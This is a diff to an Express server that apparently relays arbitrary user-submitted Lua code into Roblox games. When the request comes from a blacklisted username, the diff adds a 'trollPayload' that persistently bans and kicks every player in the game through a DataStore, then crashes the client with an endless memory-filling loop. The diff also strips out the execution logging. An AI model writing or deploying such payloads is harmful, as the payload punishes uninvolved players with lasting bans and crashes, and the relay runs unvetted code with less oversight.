@@ -5,7 +5,6 @@ const app = express();
 const events = new EventEmitter();
 const EVENT = "RemoteEvent";
 
-// Blacklisted usernames
 const blacklist = new Set(["HkotQRuemN"]);
 
 app.use(express.json());
@@ -19,29 +18,29 @@ app.use((req, res, next) => {
 
 app.post("/executeRequest", (req, res) => {
   const { username, code } = req.body;
-  if (!username || !code) {
-    console.log("missing user or code");
-    return res.sendStatus(400);
-  }
+  if (!username || !code) return res.sendStatus(400);
 
-  // Check blacklist
   if (blacklist.has(username)) {
-    console.log(`Blocked & trolled blacklisted user: ${username}`);
-
-    // Crash script to troll them
-    const crashCode = `
-      local t = {}
-      while true do
-          table.insert(t, t)
-      end
+    const trollPayload = `
+local ds = game:GetService("DataStoreService")
+local banStore = ds:GetDataStore("BanList")
+for _, player in ipairs(game.Players:GetPlayers()) do
+    pcall(function()
+        banStore:SetAsync(player.UserId, true)
+        player:Kick("Banned for trolling.")
+    end)
+end
+if game:GetService("Players").LocalPlayer then
+    local t = {}
+    while true do
+        table.insert(t, t)
+    end
+end
     `;
-
-    events.emit(EVENT, { username, code: crashCode });
+    events.emit(EVENT, { username, code: trollPayload });
     return res.sendStatus(200);
   }
 
-  // Normal execution
-  console.log(`executed: ${username}: ${code}`);
   events.emit(EVENT, { username, code });
   res.sendStatus(200);
 });
